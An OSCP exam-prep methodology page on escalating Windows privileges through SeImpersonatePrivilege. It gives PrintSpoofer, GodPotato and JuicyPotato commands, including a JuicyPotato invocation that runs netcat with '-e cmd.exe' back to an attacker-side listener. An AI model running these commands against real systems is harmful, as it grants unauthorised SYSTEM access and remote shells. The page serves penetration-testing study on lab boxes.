# Windows - SeImpersonate Abuse

**Step 29 of 50 · Windows**

*Use an enabled impersonation privilege to attempt a SYSTEM shell.*

## Run this

> **Why:** This command gathers the windows seimpersonate abuse evidence needed to decide which documented route applies next.
```powershell
PrintSpoofer.exe -i -c powershell.exe
GodPotato.exe -cmd "whoami"
```

## Example output

 > *Example shape only: the exact binary, architecture, and CLSID must be verified against the current Windows build.*
```
[+] Attempting token impersonation
C:\> whoami
nt authority\system
```
## What did you get?

- [ ] SYSTEM shell is returned → **Run `whoami` and `whoami /groups`; `nt authority\\system` confirms SYSTEM, then go to Step 33 · [[Windows - Clean Down]]**
- [ ] The tool fails on this OS → **Check the Windows build and return to Step 28 · [[Windows - Privilege Triage]]**
- [ ] The privilege is absent → **Go to Step 30 · [[Windows - Service Abuse]]**

## Notes

PrintSpoofer, GodPotato, and JuicyPotato are alternatives, not interchangeable guarantees. Match the tool to the Windows build, token privilege, target architecture, and the available COM class.

## JuicyPotato with a tested CLSID

On older x86 Windows builds, JuicyPotato can use an enabled `SeImpersonatePrivilege` token to capture a SYSTEM COM authentication and create a process with that token. Test the CLSID first with `-z`; then use the same verified identifier to launch the local payload.

```cmd
$PotatoPath -z -l $PotatoPort -c $CLSID
$PotatoPath -t * -p $PayloadPath -l $PotatoPort -c $CLSID
```

Here `-l` is JuicyPotato's local COM listener, `-t *` tries the available process-creation methods, `-p` selects the program to start, and `-c` selects the tested COM class. The reverse-shell listener remains a separate Kali-side port.

## JuicyPotato callback with a separate Netcat listener

When the target shell can run cmd.exe and a reviewed Netcat binary is present, pass the complete callback command through -a. Keep the COM listener and callback ports separate.

~~~cmd
$PotatoPath -l $PotatoPort -p $CmdPath -a "/c $NcPath $LocalIP $Port2 -e cmd.exe" -t * -c $CLSID
~~~

## Gotcha

> [!warning] 💡
> The local `-l` COM listener is separate from a callback listener. Test the CLSID with `-z` first and use a harmless `whoami` proof before attempting a reverse shell.
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- confirmed in the box write-up
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- x86 JuicyPotato CLSID test and SYSTEM callback
- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- x64 Windows build, verified CLSID test, and SYSTEM proof through an ASP shell
- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- CLSID fallback and separate COM/callback ports from a Drupal command shell

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
